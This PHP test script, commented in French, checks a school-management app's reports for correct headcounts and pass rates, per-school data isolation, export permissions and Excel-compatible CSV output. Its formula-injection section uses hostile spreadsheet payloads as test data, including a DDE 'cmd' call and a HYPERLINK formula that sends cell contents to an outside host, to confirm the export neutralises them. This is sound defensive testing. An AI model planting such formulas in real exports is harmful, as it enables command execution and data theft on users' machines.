<?php
/**
 * Phase 9C — rapports : exactitude, isolation, export.
 *
 * Ce que ces tests protègent
 * --------------------------
 *  · les chiffres sont JUSTES — l'invariant garçons + filles = effectif
 *    tient, y compris quand un élève est archivé ;
 *  · un bulletin sans décision n'est ni une réussite ni un échec ;
 *  · une école ne voit jamais les chiffres d'une autre ;
 *  · `report.export` est distincte de `report.academic` ;
 *  · le CSV s'ouvre dans Excel francophone — BOM, `;`, décimale virgule ;
 *  · un export laisse une trace dans le journal.
 *
 * Usage : php tests/reports_isolation.php
 */
declare(strict_types=1);

require dirname(__DIR__) . '/app/bootstrap.php';
require_once APP_PATH . '/modules/curriculum/services.php';
require_once APP_PATH . '/modules/students/services.php';
require_once APP_PATH . '/modules/reports/services.php';
require_once APP_PATH . '/modules/students/repositories.php';

$pass = 0;
$fail = 0;

function check(string $label, bool $ok, string $detail = ''): void
{
    global $pass, $fail;
    $ok ? $pass++ : $fail++;
    printf("  %s %s%s\n", $ok ? '✓' : '✗', $label, $detail !== '' ? " — {$detail}" : '');
}

function act_as(int $schoolId, string $roleCode): int
{
    static $n = 0;
    $n++;

    $userId = db_insert('users', [
        'uuid'          => str_uuid(),
        'school_id'     => $schoolId,
        'username'      => 'rap.' . strtolower($roleCode) . '.' . $n,
        'email'         => 'rap' . $n . '@example.test',
        'password_hash' => password_hash('MotDePasse2026', PASSWORD_BCRYPT, ['cost' => 4]),
        'last_name'     => 'RAPPORT',
        'first_name'    => ucfirst(strtolower($roleCode)),
        'status'        => 'active',
    ], true);

    db_query(
        'INSERT INTO user_roles (user_id, role_id)
         SELECT :u, id FROM roles WHERE code = :c AND school_id IS NULL',
        ['u' => $userId, 'c' => $roleCode],
        true
    );

    reprendre($userId, $schoolId);

    return $userId;
}

function reprendre(int $userId, int $schoolId): void
{
    $_SESSION['user_id']   = $userId;
    $_SESSION['school_id'] = $schoolId;

    auth_user(true);
    perm_all(true);
    perm_roles(true);
    tenant_set($schoolId);
}

/**
 * Une école avec une classe et des élèves de sexes connus.
 *
 * @return array<string, mixed>
 */
function ecole(string $code, string $nom, int $garcons, int $filles): array
{
    $schoolId = db_insert('schools', [
        'uuid' => str_uuid(), 'code' => $code, 'slug' => strtolower($code),
        'name' => $nom, 'status' => 'active',
    ], true);

    db_query(
        'INSERT INTO school_cycles (school_id, cycle_id, is_active)
         SELECT :s, id, 1 FROM education_cycles',
        ['s' => $schoolId]
    );

    act_as($schoolId, 'DIRECTION');

    $yearId = tenant_insert('academic_years', [
        'code' => '2095-2096', 'name' => 'Test rapports', 'starts_on' => '2095-09-01',
        'ends_on' => '2096-07-31', 'status' => 'active', 'is_current' => 1,
    ]);

    curriculum_service_import_national();
    curriculum_service_create_standard_periods($yearId);

    $levelId = (int) db_value("SELECT id FROM education_levels WHERE code = 'CTEB_7'", [], true);
    $program = curriculum_service_create_program($yearId, $levelId, null, null);
    curriculum_service_fill_program((int) $program['id']);
    curriculum_service_activate((int) $program['id']);

    $classroom = tenant_insert('classrooms', [
        'academic_year_id' => $yearId, 'curriculum_id' => (int) $program['id'],
        'code' => '7A', 'name' => '7ème A', 'capacity' => 40,
    ]);

    $eleves = [];

    foreach (['M' => $garcons, 'F' => $filles] as $sexe => $combien) {
        for ($i = 0; $i < $combien; $i++) {
            $eleve = students_service_enroll_new(
                ['last_name' => 'TEST' . $sexe . $i, 'first_name' => 'Eleve',
                 'gender' => $sexe, 'birth_date' => '2011-03-08', 'birth_place' => 'Kolwezi'],
                $yearId,
                $classroom
            );

            $eleves[] = [
                'id'         => (int) $eleve['id'],
                'enrollment' => (int) students_repo_enrollment((int) $eleve['id'], $yearId)['id'],
            ];
        }
    }

    return [
        'id' => $schoolId, 'year' => $yearId, 'classroom' => $classroom,
        'eleves' => $eleves, 'direction' => (int) $_SESSION['user_id'],
    ];
}

echo "\n  RAPPORTS — EXACTITUDE, ISOLATION, EXPORT\n";
echo "  ───────────────────────────────────────────\n\n";

$ecoles = [];

try {
    $A = ecole('RAP-A', 'Institut Alpha', 5, 3);
    $ecoles[] = $A['id'];

    // =================================================================
    echo "  LES EFFECTIFS S'ADDITIONNENT\n";

    $lignes = reports_repo_headcount($A['year']);

    check('Une ligne par classe', count($lignes) === 1, count($lignes) . ' ligne(s)');

    $l = $lignes[0];

    check('Les garçons sont comptés', (int) $l['garcons'] === 5, (string) $l['garcons']);
    check('Les filles aussi', (int) $l['filles'] === 3, (string) $l['filles']);
    check('L\'effectif est la somme', (int) $l['effectif'] === 8);
    check('La capacité est reprise', (int) $l['capacity'] === 40);
    check('Le remplissage est calculé', reports_rate(8, 40) === 20.0);

    // L'INVARIANT, ÉPROUVÉ SUR LE CAS QUI L'AVAIT CASSÉ.
    //
    // La jointure écarte les élèves archivés ; `effectif` ne testait que
    // le statut de l'inscription. Après archivage d'une élève, le
    // rapport annonçait « 4 garçons, 3 filles, effectif 8 ».
    db_query('UPDATE students SET deleted_at = NOW() WHERE id = :i AND school_id = :s',
        ['i' => $A['eleves'][0]['id'], 's' => $A['id']], true);

    $apres = reports_repo_headcount($A['year'])[0];

    check('Un élève archivé sort du total ET de sa colonne',
        (int) $apres['garcons'] + (int) $apres['filles'] === (int) $apres['effectif'],
        $apres['garcons'] . ' + ' . $apres['filles'] . ' = ' . $apres['effectif']);

    check('…et l\'effectif a bien baissé de un', (int) $apres['effectif'] === 7);

    db_query('UPDATE students SET deleted_at = NULL WHERE id = :i AND school_id = :s',
        ['i' => $A['eleves'][0]['id'], 's' => $A['id']], true);

    // Une inscription annulée sort de l'effectif, mais reste comptée.
    db_query('UPDATE enrollments SET status = \'cancelled\' WHERE id = :i AND school_id = :s',
        ['i' => $A['eleves'][1]['enrollment'], 's' => $A['id']], true);

    $annule = reports_repo_headcount($A['year'])[0];

    check('Une inscription annulée quitte l\'effectif',
        (int) $annule['effectif'] === 7, (string) $annule['effectif']);

    check('…mais elle est comptée sous « partis »',
        (int) $annule['partis'] === 1);

    check('Et le total s\'additionne toujours',
        (int) $annule['garcons'] + (int) $annule['filles'] === (int) $annule['effectif']);

    db_query('UPDATE enrollments SET status = \'enrolled\' WHERE id = :i AND school_id = :s',
        ['i' => $A['eleves'][1]['enrollment'], 's' => $A['id']], true);

    // =================================================================
    echo "\n  UN BULLETIN SANS DÉCISION N'EST PAS UN ÉCHEC\n";

    // Cinq bulletins : 2 réussites, 1 échec, 2 sans décision du conseil.
    $decisions = ['passed', 'passed', 'failed', null, null];

    foreach ($decisions as $rang => $decision) {
        tenant_insert('bulletins', [
            'enrollment_id' => $A['eleves'][$rang]['enrollment'],
            'period_key'    => 'T1',
            'total_points'  => 300 + $rang * 10,
            'max_points'    => 560,
            'percentage'    => 50 + $rang * 5,
            'decision'      => $decision,
            'missing_grades' => 2,
            // `published_at` est NOT NULL : un bulletin n'existe qu'une
            // fois publié. Le rapport n'a donc pas de colonne « publiés ».
            'published_at'  => date('Y-m-d H:i:s'),
        ]);
    }

    check('Les regroupements sont lus, pas déclarés',
        reports_repo_period_keys($A['year']) === ['T1']);

    $r = reports_repo_results($A['year'], 'T1')[0];

    check('Les bulletins sont comptés', (int) $r['bulletins'] === 5, (string) $r['bulletins']);
    check('Il n\'y a pas de colonne « publiés » — elle ne pourrait pas varier',
        !array_key_exists('publies', $r),
        '`published_at` est NOT NULL : la table EST la publication');
    check('Les décidés excluent les NULL', (int) $r['decides'] === 3, (string) $r['decides']);
    // Trois élèves de la classe n'ont AUCUN bulletin. La jointure externe
    // les rend avec `decision` à NULL : ils étaient comptés ici.
    check('Les sans-décision comptent des BULLETINS, pas des élèves sans bulletin',
        (int) $r['sans_decision'] === 2, (string) $r['sans_decision']);

    check('Et l\'invariant tient : bulletins = décidés + sans décision',
        (int) $r['bulletins'] === (int) $r['decides'] + (int) $r['sans_decision'],
        $r['bulletins'] . ' = ' . $r['decides'] . ' + ' . $r['sans_decision']);
    check('Les réussites sont exactes', (int) $r['reussites'] === 2);
    check('Les échecs aussi', (int) $r['echecs'] === 1);

    // LE POINT QUI COMPTE : 2 réussites sur 3 DÉCIDÉS, pas sur 5.
    check('Le taux porte sur les décidés, pas sur tous',
        reports_rate((int) $r['reussites'], (int) $r['decides']) === 66.7,
        (string) reports_rate((int) $r['reussites'], (int) $r['decides']));

    check('Un taux sans dénominateur vaut « inconnu », pas zéro',
        reports_rate(0, 0) === null && reports_rate_display(null) === '—');

    check('Les cotes manquantes sont totalisées', (int) $r['cotes_manquantes'] === 10);

    check('La moyenne est calculée sur les bulletins présents',
        abs((float) $r['moyenne'] - 60.0) < 0.01, (string) $r['moyenne']);

    // Un regroupement inexistant ne doit rien inventer.
    $vide = reports_repo_results($A['year'], 'T9')[0];

    check('Un regroupement absent rend zéro, pas une erreur',
        (int) $vide['bulletins'] === 0 && $vide['moyenne'] === null);

    // =================================================================
    echo "\n  L'ASSIDUITÉ SE CALCULE SUR CE QUI A ÉTÉ POINTÉ\n";

    $span = reports_repo_attendance_span($A['year']);

    check('Sans séance, la plage est vide', $span['first'] === null);

    $seance = tenant_insert('attendance_sessions', [
        'classroom_id' => $A['classroom'],
        'session_date' => '2095-10-14',
        'slot'         => 'morning',
        'taken_by'     => $A['direction'],
        'taken_at'     => '2095-10-14 08:05:00',
    ]);

    foreach ([['present', 0], ['present', 0], ['late', 1], ['absent', 0], ['absent', 0]] as $rang => [$statut, $_]) {
        tenant_insert('attendance_records', [
            'session_id'    => $seance,
            'enrollment_id' => $A['eleves'][$rang]['enrollment'],
            'status'        => $statut,
            'is_justified'  => $statut === 'absent' && $rang === 3 ? 1 : 0,
        ]);
    }

    $a = reports_repo_attendance($A['year'], null, null)[0];

    check('La séance est comptée une fois', (int) $a['seances'] === 1);
    check('Les pointages aussi', (int) $a['pointages'] === 5, (string) $a['pointages']);
    check('Les présences sont exactes', (int) $a['presences'] === 2);
    check('Les retards sont distingués des absences',
        (int) $a['retards'] === 1 && (int) $a['absences'] === 2);
    check('Les absences justifiées sont comptées', (int) $a['justifiees'] === 1);

    // UN RETARD RESTE UNE PRÉSENCE : l'élève est là.
    check('Le taux compte le retard comme une présence',
        reports_rate((int) $a['presences'] + (int) $a['retards'], (int) $a['pointages']) === 60.0,
        (string) reports_rate((int) $a['presences'] + (int) $a['retards'], (int) $a['pointages']));

    // Les bornes de dates doivent réellement borner.
    check('Une plage antérieure exclut la séance',
        (int) reports_repo_attendance($A['year'], '2095-09-01', '2095-10-13')[0]['seances'] === 0);

    check('Une plage qui l\'englobe la garde',
        (int) reports_repo_attendance($A['year'], '2095-10-14', '2095-10-14')[0]['seances'] === 1);

    check('La plage connue est rendue', reports_repo_attendance_span($A['year'])['first'] === '2095-10-14');

    // =================================================================
    echo "\n  LE CSV S'OUVRE DANS EXCEL FRANCOPHONE\n";

    $csv = reports_build_csv(['Classe', 'Élèves', 'Taux %'], [['7ème A', '8', '20,0']]);

    check('Il commence par le BOM UTF-8', str_starts_with($csv, "\xEF\xBB\xBF"),
        'sans lui, Excel massacre les accents');

    check('Le séparateur est le point-virgule', str_contains($csv, 'Classe;Élèves'),
        'la virgule produirait une seule colonne');

    check('Les accents sont intacts', str_contains($csv, 'Élèves'));

    check('La décimale reste une virgule', str_contains($csv, '20,0'));

    check('Un champ contenant le séparateur est protégé',
        str_contains(reports_build_csv(['A'], [['x;y']]), '"x;y"'));

    check('Les nombres sont formatés à la française',
        reports_csv_number(66.666) === '66,7' && reports_csv_number(null) === '');

    // =================================================================
    echo "\n  LE CSV NE TRANSPORTE PAS DE FORMULES\n";

    // UN EXPORT S'OUVRE DANS EXCEL, ET EXCEL ÉVALUE LES FORMULES.
    //
    // Les noms de classes et d'élèves sont saisis par l'école. Une classe
    // nommée `=HYPERLINK("http://ailleurs.cd?d="&A1;"Cliquez")` exfiltre
    // le contenu d'une autre cellule dès que le directeur clique. Mesuré
    // sur l'export livré : sept charges sur sept passaient intactes.
    foreach (['=1+1', '=cmd|\'/c calc\'!A1', '+1+1', '-1+1', '@SUM(A1:A9)',
              "\t=1+1", '=HYPERLINK("http://x.cd","c")'] as $charge) {
        $cellule = trim(explode("\n", reports_build_csv(['Classe'], [[$charge]]))[1] ?? '');

        check('« ' . str_replace("\t", '\\t', substr($charge, 0, 22)) . ' » est désarmé',
            preg_match('/^"?[=+\-@\t\r]/', $cellule) !== 1, $cellule);
    }

    // ET CE QUI NE DOIT PAS ÊTRE ABÎMÉ.
    // Préfixer un nombre négatif en ferait du texte, et la colonne ne
    // s'additionnerait plus dans Excel.
    check('Un nombre négatif reste un nombre', csv_safe_cell('-1250,00') === '-1250,00');
    check('Un entier aussi', csv_safe_cell('8') === '8');
    check('Un nom ordinaire est intact', csv_safe_cell('5ème primaire A') === '5ème primaire A');
    check('Une cellule vide reste vide', csv_safe_cell('') === '');

    // =================================================================
    echo "\n  L'EXACTITUDE REPOSE SUR TROIS CONTRAINTES D'UNICITÉ\n";

    // Sans elles, chaque agrégat compterait double sans rien signaler.
    // Ce test existe pour qu'une suppression de contrainte devienne
    // rouge ici, et non silencieuse dans un état remis à la tutelle.
    $unique = static function (string $table, array $colonnes): bool {
        $par = [];

        // `SHOW INDEX` ne porte aucun filtre d'école : le garde-fou le
        // refuse hors périmètre plateforme, et il a raison.
        $index = platform_scope_cli(
            static fn (): array => db_all('SHOW INDEX FROM ' . $table, [], true)
        );

        foreach ($index as $i) {
            if ((int) $i['Non_unique'] === 0) {
                $par[$i['Key_name']][(int) $i['Seq_in_index']] = $i['Column_name'];
            }
        }

        foreach ($par as $colonnesIndex) {
            ksort($colonnesIndex);

            if (array_values($colonnesIndex) === $colonnes) {
                return true;
            }
        }

        return false;
    };

    check('Un bulletin par inscription et par période',
        $unique('bulletins', ['school_id', 'enrollment_id', 'period_key']));

    check('Une inscription par élève et par année',
        $unique('enrollments', ['student_id', 'academic_year_id']));

    check('Un pointage par séance et par inscription',
        $unique('attendance_records', ['school_id', 'session_id', 'enrollment_id']));

    // =================================================================
    echo "\n  UNE CLASSE VIDE RESTE UNE LIGNE\n";

    // Les agrégats sont désormais recollés à un squelette de classes.
    // Une jointure interne aurait fait disparaître les classes sans
    // élève, sans bulletin ou sans pointage — or une classe vide est une
    // information, pas une absence.
    $videId = tenant_insert('classrooms', [
        'academic_year_id' => $A['year'],
        'curriculum_id'    => (int) db_value(
            'SELECT curriculum_id FROM classrooms WHERE id = :c AND school_id = :s',
            ['c' => $A['classroom'], 's' => $A['id']],
            true
        ),
        'code' => 'VIDE', 'name' => 'Classe sans élève', 'capacity' => 30,
    ]);

    $avecVide = reports_repo_headcount($A['year']);

    check('Une classe sans élève figure au rapport', count($avecVide) === 2,
        count($avecVide) . ' ligne(s)');

    $vide = null;

    foreach ($avecVide as $ligne) {
        if ((int) $ligne['id'] === $videId) {
            $vide = $ligne;
        }
    }

    check('…avec un effectif nul, pas une absence',
        $vide !== null && (int) $vide['effectif'] === 0);

    check('Elle figure aussi aux résultats',
        count(reports_repo_results($A['year'], 'T1')) === 2);

    check('Et à l\'assiduité',
        count(reports_repo_attendance($A['year'], null, null)) === 2);

    check('Les trois rapports listent les classes dans le MÊME ordre',
        array_column(reports_repo_headcount($A['year']), 'id')
        === array_column(reports_repo_results($A['year'], 'T1'), 'id')
        && array_column(reports_repo_headcount($A['year']), 'id')
        === array_column(reports_repo_attendance($A['year'], null, null), 'id'));

    db_query('DELETE FROM classrooms WHERE id = :c AND school_id = :s',
        ['c' => $videId, 's' => $A['id']], true);

    // =================================================================
    echo "\n  LES TOTAUX\n";

    $total = reports_total(
        [['a' => 2, 'b' => 3], ['a' => 4, 'b' => 5]],
        ['a', 'b', 'absent']
    );

    check('Les colonnes sont additionnées', $total['a'] === 6 && $total['b'] === 8);
    check('Une colonne absente vaut zéro, pas une erreur', $total['absent'] === 0);

    // =================================================================
    echo "\n  LIRE ET EXPORTER SONT DEUX POUVOIRS DISTINCTS\n";

    check('La DIRECTION lit et exporte',
        can('report.academic') && can('report.export'));

    act_as($A['id'], 'ENSEIGNANT');

    check('Un enseignant ne lit aucun rapport', !can('report.academic'));
    check('…ni n\'exporte', !can('report.export'));

    act_as($A['id'], 'COMPTABLE');

    check('Le comptable exporte mais ne lit pas les rapports scolaires',
        can('report.export') && !can('report.academic'),
        'report.financial lui ouvre ses propres états');

    // =================================================================
    echo "\n  AUCUNE ÉCOLE NE VOIT LES CHIFFRES D'UNE AUTRE\n";

    $B = ecole('RAP-B', 'Lycée Bêta', 2, 1);
    $ecoles[] = $B['id'];

    $chiffresB = reports_repo_headcount($B['year']);

    check('B ne voit que sa classe', count($chiffresB) === 1);
    check('Et son effectif est le sien', (int) $chiffresB[0]['effectif'] === 3,
        (string) $chiffresB[0]['effectif']);

    // L'année de A, demandée depuis B : la requête porte l'école dans sa
    // clause, elle ne doit rien rendre.
    check('L\'année de A ne rend rien depuis B',
        reports_repo_headcount($A['year']) === []);

    check('Ni ses résultats', reports_repo_results($A['year'], 'T1') === []);

    check('Ni son assiduité', reports_repo_attendance($A['year'], null, null) === []);

    check('Ni ses regroupements', reports_repo_period_keys($A['year']) === []);

    check('Ni sa plage de pointage',
        reports_repo_attendance_span($A['year'])['first'] === null);

    reprendre($A['direction'], $A['id']);

    check('Et A retrouve bien les siens',
        (int) reports_repo_headcount($A['year'])[0]['effectif'] === 8);

    // =================================================================
    echo "\n  UN EXPORT LAISSE UNE TRACE\n";

    $avant = (int) db_value(
        'SELECT COUNT(*) FROM audit_logs WHERE school_id = :s AND action = \'report.exported\'',
        ['s' => $A['id']],
        true
    );

    audit_log('report.exported', 'reports', null, null,
        ['rapport' => 'effectifs-test', 'lignes' => 1], 'Export d\'un rapport');

    check('L\'export est journalisé',
        (int) db_value(
            'SELECT COUNT(*) FROM audit_logs WHERE school_id = :s AND action = \'report.exported\'',
            ['s' => $A['id']],
            true
        ) === $avant + 1);
} finally {
    unset($_SESSION['user_id'], $_SESSION['school_id']);

    foreach ($ecoles as $schoolId) {
        tenant_set($schoolId);
        db_query('UPDATE classrooms SET main_teacher_id = NULL WHERE school_id = :s', ['s' => $schoolId], true);

        foreach ([
            'documents', 'document_counters', 'sync_conflicts', 'sync_queue', 'sync_devices',
            'payment_allocations', 'payments', 'student_fees', 'fees', 'receipt_counters',
            'attendance_records', 'attendance_sessions', 'bulletin_lines', 'bulletins',
            'grades', 'student_history', 'orientations', 'student_guardians',
            'enrollments', 'guardians', 'students', 'student_counters',
            'teacher_subjects', 'teachers', 'classrooms', 'curriculum_subjects',
            'curriculums', 'grade_periods', 'subjects', 'options', 'sections',
            'academic_years', 'audit_logs',
        ] as $table) {
            db_query("DELETE FROM {$table} WHERE school_id = :s", ['s' => $schoolId], true);
        }

        db_query('DELETE FROM school_settings WHERE school_id = :s', ['s' => $schoolId], true);
        db_query('DELETE FROM user_roles WHERE user_id IN (SELECT id FROM users WHERE school_id = :s)', ['s' => $schoolId], true);
        db_query('DELETE FROM users WHERE school_id = :s', ['s' => $schoolId], true);
        db_query('DELETE FROM school_cycles WHERE school_id = :s', ['s' => $schoolId], true);
        db_query('DELETE FROM schools WHERE id = :s', ['s' => $schoolId], true);
    }
}

echo "\n  ──────────────────────────────────────────────────\n";
printf("  %d test(s) réussi(s), %d échec(s)\n\n", $pass, $fail);

exit($fail === 0 ? 0 : 1);
